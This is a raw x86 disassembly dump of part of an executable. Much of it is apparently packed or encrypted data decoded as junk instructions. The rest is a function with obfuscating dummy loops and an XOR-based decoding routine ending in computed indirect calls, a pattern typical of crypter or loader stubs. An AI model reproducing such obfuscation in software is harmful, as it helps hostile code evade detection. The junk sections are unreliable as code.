  4069e1:	data16 (bad) 
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	pop    eax
  4069ea:	aas    
  4069eb:	inc    ebx
  4069ec:	fsub   DWORD PTR [eax+0x77]
  4069ef:	add    eax,0x2c99360d
  4069f4:	ins    DWORD PTR es:[edi],dx
  4069f5:	mov    eax,0xb5f82e03
  4069fa:	inc    esi
  4069fb:	arpl   WORD PTR [ecx+0x79b53471],dx
  406a01:	and    al,0x14
  406a03:	mov    dl,0xb0
  406a05:	dec    ebx
  406a06:	push   cs
  406a07:	ret    
  406a08:	loop   0x4069d5
  406a0a:	jno    0x4069b2
  406a0c:	mov    ecx,0x881946d0
  406a11:	adc    DWORD PTR [esi-0x1f492f79],ebx
  406a17:	inc    esp
  406a18:	inc    ebp
  406a19:	mov    ch,BYTE PTR [ebp-0x68]
  406a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a1d:	cmp    DWORD PTR [edx-0x7add7988],0xb5f2cf17
  406a27:	test   ebx,edx
  406a29:	jmp    0x406a51
  406a2b:	mov    esi,0xadf511a
  406a30:	ja     0x4069ec
  406a32:	cmp    eax,0x11d01114
  406a37:	adc    ah,bh
  406a39:	aam    0x95
  406a3b:	jge    0x406a8b
  406a3d:	sub    al,0xf9
  406a3f:	call   0x49222305
  406a44:	dec    edx
  406a45:	retf   0x9497
  406a48:	push   ecx
  406a49:	cmp    edx,edx
  406a4b:	retf   
  406a4c:	add    eax,0xbcefb5e3
  406a51:	or     DWORD PTR [edi],0x7c
  406a54:	pop    ebx
  406a55:	push   edx
  406a56:	imul   edi,edi,0xffffffd4
  406a59:	cmp    BYTE PTR [edi-0x13],dh
  406a5c:	xchg   esi,eax
  406a5d:	retf   0x261a
  406a60:	es sbb al,0x73
  406a63:	jns    0x406acb
  406a65:	xor    eax,0x6d16b3db
  406a6a:	and    bl,BYTE PTR [eax-0x4a]
  406a6d:	mov    al,0x4a
  406a6f:	push   esi
  406a70:	cdq    
  406a71:	xchg   DWORD PTR [ebx-0x6df3935f],esp
  406a77:	sbb    DWORD PTR [eax+0x7f],0x1d6af99b
  406a7e:	xlat   BYTE PTR ds:[ebx]
  406a7f:	call   0x772b2670
  406a84:	cwde   
  406a85:	popf   
  406a86:	test   al,0xbd
  406a88:	or     edi,edx
  406a8a:	aad    0xd7
  406a8c:	cs je  0x406a2f
  406a8f:	mov    ds:0xfa5ad2fb,eax
  406a94:	out    0xde,eax
  406a96:	popa   
  406a97:	and    DWORD PTR [eax],0xffffff93
  406a9a:	call   0xd6883095
  406a9f:	mov    eax,0xa3f6026
  406aa4:	jmp    0x8a40e6f0
  406aa9:	(bad)  
  406aaa:	jmp    0x20c00ba3
  406aaf:	mov    dl,0x0
  406ab1:	mov    edx,0x3ed2eb09
  406ab6:	xor    edi,DWORD PTR [ebp+0x9d5244c]
  406abc:	add    BYTE PTR [edi+0x3c3c1837],0x6c
  406ac3:	cld    
  406ac4:	jns    0x406b10
  406ac6:	call   0x571c:0x7c36f2b6
  406acd:	xor    BYTE PTR [ebx+edx*8+0x108cf376],ah
  406ad4:	sbb    esp,0x33d8391
  406ada:	mov    BYTE PTR [esi+0x5],ch
  406add:	pop    es
  406ade:	adc    DWORD PTR [eax+0x35],ecx
  406ae1:	mov    ah,0x45
  406ae3:	rcl    DWORD PTR ds:0x673353dc,1
  406ae9:	jge    0x406ad8
  406aeb:	dec    ebp
  406aec:	push   esp
  406aed:	push   esi
  406aee:	sub    DWORD PTR [edx-0x1421e014],esi
  406af4:	daa    
  406af5:	neg    DWORD PTR [ebx+eiz*4+0x3431946c]
  406afc:	pop    es
  406afd:	sbb    ebx,DWORD PTR [ecx+edx*8+0x2aca31c3]
  406b04:	mov    dh,0x26
  406b06:	pop    edi
  406b07:	rol    ecx,cl
  406b09:	lea    ebx,[edx-0x4]
  406b0c:	out    dx,eax
  406b0d:	xor    bl,BYTE PTR [ebp+0x34dd0b5e]
  406b13:	inc    ebx
  406b14:	dec    DWORD PTR [edi-0x658c504a]
  406b1a:	push   esp
  406b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b1c:	retf   0x89bb
  406b1f:	jae    0x406b1c
  406b21:	loope  0x406b6e
  406b23:	push   edi
  406b24:	adc    edx,eax
  406b26:	ins    DWORD PTR es:[edi],dx
  406b27:	out    0x98,eax
  406b29:	sub    ebp,DWORD PTR [edx-0x4a464457]
  406b2f:	shl    DWORD PTR [ebp+ebx*8-0x18],1
  406b33:	iret   
  406b34:	jbe    0x406bab
  406b36:	loopne 0x406bad
  406b38:	test   DWORD PTR [edi+0xe62b968],ebp
  406b3e:	retf   0x8b7b
  406b41:	add    al,BYTE PTR [edx]
  406b43:	xor    eax,0xf96a9f8c
  406b48:	jmp    DWORD PTR es:[edi+0x7f]
  406b4c:	or     eax,0x7e05d7ce
  406b51:	xor    eax,0x45d5268a
  406b56:	jae    0x406b26
  406b58:	imul   ecx,DWORD PTR [edi-0x1883f2b4],0xb1e60df4
  406b62:	out    dx,eax
  406b63:	inc    eax
  406b64:	(bad)  
  406b65:	jg     0x406ba9
  406b67:	scas   eax,DWORD PTR es:[edi]
  406b68:	cmp    cl,ah
  406b6a:	dec    ebx
  406b6b:	dec    ebp
  406b6c:	arpl   cx,sp
  406b6e:	(bad)  
  406b6f:	sub    eax,0x9654db6f
  406b74:	add    DWORD PTR [edi-0x6d],edx
  406b77:	or     eax,0xac232964
  406b7c:	push   ebx
  406b7d:	push   esp
  406b7e:	lock outs dx,BYTE PTR ds:[esi]
  406b80:	clc    
  406b81:	(bad)  
  406b83:	repnz inc esi
  406b85:	jne    0x406bd9
  406b87:	jne    0x406b2f
  406b89:	jmp    0xff48a4e
  406b8e:	sbb    bl,bl
  406b90:	pop    edi
  406b91:	or     BYTE PTR [ebx],bl
  406b93:	xor    ch,ah
  406b95:	sub    eax,0x52970cdf
  406b9a:	dec    ecx
  406b9b:	mov    bl,BYTE PTR [ebx]
  406b9d:	test   al,0xa5
  406b9f:	rcl    BYTE PTR [ebp+0x21],1
  406ba2:	adc    al,0xc1
  406ba4:	adc    al,0x74
  406ba6:	emms   
  406ba8:	rep outs dx,BYTE PTR ds:[esi]
  406baa:	jnp    0x406bc3
  406bac:	cs out 0x2e,eax
  406baf:	jle    0x406bc5
  406bb1:	inc    ecx
  406bb2:	sti    
  406bb3:	sbb    eax,0x46a77801
  406bb8:	in     al,dx
  406bb9:	ror    ebx,cl
  406bbb:	mov    edx,edx
  406bbd:	mov    esp,0x6cce0964
  406bc2:	js     0x406be5
  406bc4:	out    dx,eax
  406bc5:	dec    edx
  406bc6:	pop    ebp
  406bc7:	add    dl,BYTE PTR [edi+ebp*8-0xf]
  406bcb:	push   edi
  406bcc:	sti    
  406bcd:	in     al,dx
  406bce:	xor    ah,BYTE PTR [ebp+0x53]
  406bd1:	rol    DWORD PTR [esi-0x3d25f78b],0x67
  406bd8:	mul    dl
  406bda:	add    eax,0x9c1c614d
  406bdf:	add    eax,0x514e82f2
  406be4:	repz cwde 
  406be6:	xor    eax,0x36010e7f
  406beb:	(bad)
  406bee:	mov    bl,0xe5
  406bf0:	xchg   ebp,eax
  406bf1:	inc    ecx
  406bf2:	stc    
  406bf3:	call   0x426c:0xa23f5840
  406bfa:	and    BYTE PTR [eax+ebp*2],ch
  406bfd:	inc    edi
  406bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bff:	pop    DWORD PTR [edx-0x3830a812]
  406c05:	mov    al,BYTE PTR [edx-0x74]
  406c08:	and    ecx,DWORD PTR [ebp+0x64]
  406c0b:	push   0xffffffa7
  406c0d:	cdq    
  406c0e:	cmp    eax,0xae2e473f
  406c13:	lds    ebp,FWORD PTR ds:0xedf3e443
  406c19:	scas   al,BYTE PTR es:[edi]
  406c1a:	(bad)  
  406c1b:	ret    
  406c1c:	lods   eax,DWORD PTR ds:[esi]
  406c1d:	jbe    0x406c54
  406c1f:	out    dx,eax
  406c20:	cmp    al,0x6e
  406c22:	adc    DWORD PTR [edi-0x6c],eax
  406c25:	mov    edi,0x270e1189
  406c2a:	cmp    eax,0x11230da2
  406c2f:	push   0xffffffe1
  406c31:	cmc    
  406c32:	cli    
  406c33:	sub    DWORD PTR [ebx],0x1d
  406c36:	arpl   di,di
  406c38:	adc    BYTE PTR [eax-0x4c4f8f1],ah
  406c3e:	adc    esi,DWORD PTR [esi+0x39]
  406c41:	cld    
  406c42:	shl    BYTE PTR [ebx+0x7a369d42],cl
  406c48:	fs hlt 
  406c4a:	je     0x406eec
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xf5142bde
  406c81:	in     al,dx
  406c82:	mov    edx,0x7e7ec2c7
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	push   ebp
  406c8c:	mov    ebp,0x3913f18a
  406c91:	mov    esi,0x166a9dc5
  406c96:	pushf  
  406c97:	mov    cl,0x7
  406c99:	(bad)  
  406c9a:	lahf   
  406c9b:	xor    eax,DWORD PTR [esi+0x4aa36a1e]
  406ca1:	xor    BYTE PTR [ebx-0x77],al
  406ca4:	pop    edx
  406ca5:	sub    eax,0xd3aca0d
  406caa:	cs jno 0x406c3c
  406cad:	iret   
  406cae:	gs sub edi,esp
  406cb1:	stos   BYTE PTR es:[edi],al
  406cb2:	ds js  0x406d28
  406cb5:	jle    0x406c52
  406cb7:	cdq    
  406cb8:	popf   
  406cb9:	(bad)  
  406cba:	fwait
  406cbb:	out    dx,al
  406cbc:	xchg   ebx,eax
  406cbd:	dec    esi
  406cbe:	(bad)  
  406cbf:	mov    ebx,0x38757591
  406cc4:	jbe    0x406c9e
  406cc6:	adc    al,0x33
  406cc8:	dec    edi
  406cc9:	add    al,0xb4
  406ccb:	mov    ah,0x19
  406ccd:	pop    edx
  406cce:	fs aad 0x5e
  406cd1:	(bad)  
  406cd2:	out    dx,al
  406cd3:	inc    esi
  406cd4:	pusha  
  406cd5:	imul   eax,eax,0x55
  406cd8:	in     al,0xba
  406cda:	add    ah,BYTE PTR [esi+0x62d0874d]
  406ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce1:	or     dl,0x4d
  406ce4:	adc    edx,ebp
  406ce6:	push   ecx
  406ce7:	sub    eax,0x1aa22f67
  406cec:	test   eax,0x9b061548
  406cf1:	les    esp,FWORD PTR [ecx+0x8]
  406cf4:	rcr    BYTE PTR [esi],0x25
  406cf7:	xchg   edx,eax
  406cf8:	pusha  
  406cf9:	iret   
  406cfa:	scas   eax,DWORD PTR es:[edi]
  406cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cfc:	and    BYTE PTR [esi-0x57fc4c94],ch
  406d02:	jge    0x406cd0
  406d04:	fcom   QWORD PTR [ecx+0x395601f3]
  406d0a:	(bad)
  406d0d:	out    dx,al
  406d0e:	push   eax
  406d0f:	sti    
  406d10:	or     DWORD PTR [edx],esi
  406d12:	shr    DWORD PTR [ebp+0x24],1
  406d15:	or     edi,edi
  406d17:	dec    esi
  406d18:	xchg   ebx,eax
  406d19:	xor    al,0x30
  406d1b:	jmp    0xbace:0x36093ef7
  406d22:	sub    al,0x3a
  406d24:	mov    ah,0x60
  406d26:	gs fwait
  406d28:	in     eax,dx
  406d29:	jbe    0x406ce6
  406d2b:	outs   dx,BYTE PTR ds:[esi]
  406d2c:	mov    esp,0x6d780a04
  406d31:	(bad)  
  406d32:	xchg   DWORD PTR ds:0x38313f02,ebp
  406d38:	jmp    0x8d95:0xf9aed1c3
  406d3f:	call   DWORD PTR [esi-0x16409634]
  406d45:	jecxz  0x406ce1
  406d47:	pop    edi
  406d48:	xchg   BYTE PTR [edi+0x7733ccd4],ch
  406d4e:	push   0x78e0d7d0
  406d53:	ret    0xa14f
  406d56:	lds    ecx,FWORD PTR [edi-0x5e8fb4f3]
  406d5c:	xchg   ebp,eax
  406d5d:	inc    esp
  406d5e:	les    esi,FWORD PTR [ebx]
  406d60:	pop    ecx
  406d61:	jb     0x406d64
  406d63:	(bad)  
  406d64:	adc    esi,DWORD PTR [eax]
  406d66:	sbb    ch,BYTE PTR [ebx+edx*8+0x24b164]
  406d6d:	sub    ah,BYTE PTR [edi]
  406d6f:	cmp    dh,dh
  406d71:	retf   
  406d72:	push   eax
  406d73:	lods   al,BYTE PTR ds:[esi]
  406d74:	repz popa 
  406d76:	add    edi,DWORD PTR [edx-0x16f07478]
  406d7c:	mov    BYTE PTR [ebx],dl
  406d7e:	and    BYTE PTR [eax+0x12],ah
  406d81:	adc    DWORD PTR [edi+0x44],ebx
  406d84:	xor    eax,0x825bce20
  406d89:	push   ds
  406d8a:	(bad)  
  406d8b:	loopne 0x406d83
  406d8d:	cli    
  406d8e:	arpl   si,cx
  406d90:	mov    ds:0xa28eef51,eax
  406d95:	inc    ecx
  406d96:	sahf   
  406d97:	jp     0x406d9b
  406d99:	retf   0xf4d4
  406d9c:	jl     0x406d8e
  406d9e:	in     eax,dx
  406d9f:	stos   DWORD PTR es:[edi],eax
  406da0:	dec    ecx
  406da1:	add    dl,BYTE PTR [ecx-0x3a]
  406da4:	pushf  
  406da5:	stos   DWORD PTR es:[edi],eax
  406da6:	pop    edi
  406da7:	or     BYTE PTR [edi+edx*1],ch
  406daa:	out    dx,eax
  406dab:	cdq    
  406dac:	nop
  406dad:	fs (bad) 
  406daf:	retf   0x5c7
  406db2:	inc    DWORD PTR [eax-0x16c0dedc]
  406db8:	push   ecx
  406db9:	popa   
  406dba:	adc    DWORD PTR [ecx-0x6b],esp
  406dbd:	cwde   
  406dbe:	push   ds
  406dbf:	or     DWORD PTR [edx+0x6],esp
  406dc2:	lods   al,BYTE PTR ds:[esi]
  406dc3:	test   al,0x93
  406dc5:	cmp    eax,0x5c27ba37
  406dca:	scas   al,BYTE PTR es:[edi]
  406dcb:	cmp    dl,ch
  406dcd:	call   0x17c40518
  406dd2:	scas   eax,DWORD PTR es:[edi]
  406dd3:	mov    ch,0xd8
  406dd5:	(bad)
  406dd8:	fcmovb st,st(2)
  406dda:	pop    esi
  406ddb:	lods   eax,DWORD PTR ds:[esi]
  406ddc:	jns    0x406dd3
  406dde:	test   al,0xed
  406de0:	ss mov esp,0xeb645708
  406de6:	sbb    eax,0x1ab166b7
  406deb:	pop    ebx
  406dec:	outs   dx,BYTE PTR ds:[esi]
  406ded:	imul   edx,ecx,0xfffffffe
  406df0:	cs in  eax,dx
  406df2:	nop
  406df3:	pop    es
  406df4:	enter  0x412f,0x19
  406df8:	sti    
  406df9:	mov    es,WORD PTR [edx+0x97cf4a7]
  406dff:	mov    ?,WORD PTR [edx+0x7d7cd783]
  406e05:	cmp    dl,BYTE PTR [ecx+0x5e]
  406e08:	push   esi
  406e09:	dec    edx
  406e0a:	and    al,0x35
  406e0d:	dec    edi
  406e0e:	ret    
  406e0f:	lock cmp al,0xf4
  406e12:	cmp    eax,0xacfdf790
  406e17:	mov    esp,0x1b759ae
  406e1c:	sub    DWORD PTR [edx+ebx*2-0x23],edx
  406e20:	or     BYTE PTR [esi],bh
  406e22:	daa    
  406e23:	inc    ebp
  406e24:	(bad)  
  406e25:	push   ebx
  406e26:	mov    ecx,0xbe40f822
  406e2b:	push   eax
  406e2c:	js     0x406e64
  406e2e:	pop    ds
  406e2f:	cdq    
  406e30:	ror    DWORD PTR [edi+0x5b329e82],1
  406e36:	and    DWORD PTR [ecx-0x39],eax
  406e39:	push   ebx
  406e3a:	jl     0x406e75
  406e3c:	jl     0x406e59
  406e3e:	mov    al,ds:0xbedd1e4d
  406e43:	and    esp,DWORD PTR [ebp-0x45]
  406e46:	pushf  
  406e47:	cs adc al,0x33
  406e4a:	mov    dh,BYTE PTR [esi]
  406e4c:	or     ah,0xc8
  406e4f:	arpl   WORD PTR [ebx],si
  406e51:	shr    dl,1
  406e53:	out    0x30,eax
  406e55:	clc    
  406e56:	scas   eax,DWORD PTR es:[edi]
  406e57:	(bad)  
  406e58:	fmul   QWORD PTR [eax+eiz*1]
  406e5b:	dec    esp
  406e5c:	scas   eax,DWORD PTR es:[edi]
  406e5d:	sub    eax,0x61c79436
  406e62:	call   0x918b8b3e
  406e67:	pop    edx
  406e68:	xor    DWORD PTR [ecx+0xb160555],ecx
  406e6e:	in     al,dx
  406e6f:	shl    BYTE PTR [eax],0xdd
  406e72:	mov    esp,0xab76118e
  406e77:	out    0xf2,eax
  406e79:	stc    
  406e7a:	and    BYTE PTR [esi+0x7b2538ec],bh
  406e80:	jae    0x406ea7
  406e82:	dec    edi
  406e83:	ins    DWORD PTR es:[edi],dx
  406e84:	fistp  DWORD PTR [esi]
  406e86:	push   esp
  406e87:	lock inc DWORD PTR [esi-0x79]
  406e8b:	mov    edi,0x7d4a2735
  406e90:	or     eax,0x92831b22
  406e95:	js     0x406e31
  406e97:	sar    BYTE PTR [eax+eiz*4],0x93
  406e9b:	and    DWORD PTR [edi+0x1],esi
  406e9e:	cmp    edi,DWORD PTR [eax+0x43b6184]
  406ea4:	sbb    al,0xd4
  406ea6:	adc    eax,0x2e7eccbb
  406eab:	mov    ds:0xbec2c21,eax
  406eb0:	not    DWORD PTR [ebx+0x6aeacbea]
  406eb6:	and    al,0x79
  406eb8:	mov    ah,0xb2
  406eba:	pop    esi
  406ebb:	sub    esi,DWORD PTR [ebp-0x611f3e30]
  406ec1:	hlt    
  406ec2:	xor    ebp,ebx
  406ec4:	mov    ebp,0x91ba6e5a
  406ec9:	push   esi
  406eca:	nop
  406ecb:	add    al,0xf0
  406ecd:	jecxz  0x406e87
  406ecf:	dec    DWORD PTR [ebp+0x469c63d0]
  406ed5:	imul   esp,esi,0xfffffff5
  406ed8:	pop    ebx
  406ed9:	jae    0x406e68
  406edb:	pop    esp
  406edc:	jae    0x406ecf
  406ede:	outs   dx,DWORD PTR ds:[esi]
  406edf:	in     al,dx
  406ee0:	or     al,0xdf
  406ee2:	push   ds
  406ee3:	idiv   BYTE PTR [eax-0x44cfe0ea]
  406ee9:	scas   al,BYTE PTR es:[edi]
  406eea:	add    DWORD PTR [esi],0xc910458b
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43366f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433623,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43372f,0x433613
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43372f,0x4336a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4336eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4336bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433727
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4336fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4336fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4336fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433767
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4336fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4336fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4336fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4336fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4336fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43362b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433673,0x15
  406fee:	cmp    DWORD PTR ds:0x433673,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433673,0x2
  407002:	jne    0x40701d
  407008:	push   0x43367b
  40700d:	push   0x433703
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433673,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433673
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433673,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433673
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433673,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4336ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43362f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43362f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43362f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43362f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43362f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43362f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433647
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4336b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433633,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43366f,0x433627
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43361f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4336a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4336a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4336a7,ebx
  407108:	cmp    DWORD PTR ds:0x4336a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4336a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4336a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4336a7,ebx
  407144:	cmp    DWORD PTR ds:0x4336a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4336eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43361b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433743,0x1c
  407175:	cmp    DWORD PTR ds:0x433743,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433743,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43379a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433743
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433743,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43361f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43361f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43361f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43361f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43361f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43361f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43361f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43361f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433683,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433683
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433683,ebx
  407226:	cmp    DWORD PTR ds:0x433683,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433683,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433683
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433683,ebx
  40725e:	cmp    DWORD PTR ds:0x433683,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43362f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43361f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4336f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
